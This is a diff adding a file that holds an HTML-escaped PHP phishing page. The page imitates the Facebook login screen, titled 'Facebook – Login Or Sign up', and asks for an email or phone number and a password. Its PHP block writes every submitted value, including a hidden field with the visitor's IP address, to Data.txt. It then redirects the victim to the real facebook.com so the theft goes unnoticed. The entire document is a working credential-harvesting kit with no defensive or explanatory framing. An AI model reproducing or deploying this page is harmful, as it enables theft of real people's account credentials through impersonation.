@@ -1,0 +1,52 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title></title>
+</head>
+<body>
+&lt;?php<br>
+&nbsp;&nbsp;&nbsp;if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_POST[&#39;LOGIN&#39;])){<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$handle = fopen(&quot;Data.txt&quot;, &quot;a&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($_POST as $variable =&gt; $value) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($handle, $value);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($handle, &quot;:&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($handle, &quot;\r\n&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose($handle);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Location: https://facebook.com&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+&nbsp;&nbsp;&nbsp;}<br>
+?&gt;<br>
+&lt;!DOCTYPE html&gt;<br>
+&lt;html&gt;<br>
+&lt;head&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;meta charset=&quot;utf&ndash;8&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;meta name=&quot;viewport&quot; content=&quot;width=device&ndash;width, initial&ndash;scale=1.0&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;meta property=&quot;og:image&quot; content=&quot;https://www.wyzowl.com/wp&ndash;content/uploads/2019/08/Facebook&ndash;Cover&ndash;Video&ndash;%E2%80%93&ndash;Specs&ndash;Size&ndash;and&ndash;Dimensions&ndash;for&ndash;2019.png&quot; /&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;title&gt;Facebook &ndash; Login Or Sign up&lt;/title&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;link rel=&quot;icon&quot; href=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px&ndash;Facebook_Logo_%282019%29.png&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.8.2/css/all.css&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;<br>
+&lt;/head&gt;<br>
+&lt;body&gt;<br>
+&lt;div class=&quot;alert alert&ndash;warning&quot; role=&quot;alert&quot; style=&quot;color: #1877f2; font&ndash;size: 12px; background: #ffeeba; padding: 15px; text&ndash;align: left; font&ndash;weight: bold;&quot; dir=&quot;ltr&quot;&gt;<br>
+  &lt;i class=&quot;fas fa&ndash;mobile&ndash;alt&quot;&gt;&lt;/i&gt; Download Facebook For Android<br>
+&lt;/div&gt;<br>
+&lt;header&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;h1&gt;facebook&lt;/h1&gt;<br>
+&lt;/header&gt;<br>
+&lt;center&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;form method=&quot;POST&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;text&quot; name=&quot;EMAIL&quot; placeholder=&quot;Mobile Number Or Email Address&quot; required=&quot;&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;password&quot; name=&quot;PASSWORD&quot; placeholder=&quot;Password&quot; required=&quot;&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;IP&quot; value=&quot;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;]; ?&gt;&quot;&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;button type=&quot;submit&quot; class=&quot;login&quot; name=&quot;LOGIN&quot; &gt;Continue&lt;/button&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;Or&lt;/p&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;button&gt;Create New Account&lt;/button&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;label&gt;Forget Password ?&lt;/label&gt;&lt;br&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;center&gt;&lt;img src=&quot;lang.PNG&quot; alt=&quot;&quot;&gt;&lt;/center&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;/form&gt;<br>
+&lt;/center&gt;<br>
+&lt;/body&gt;<br>
+&lt;/html&gt;</body></html>
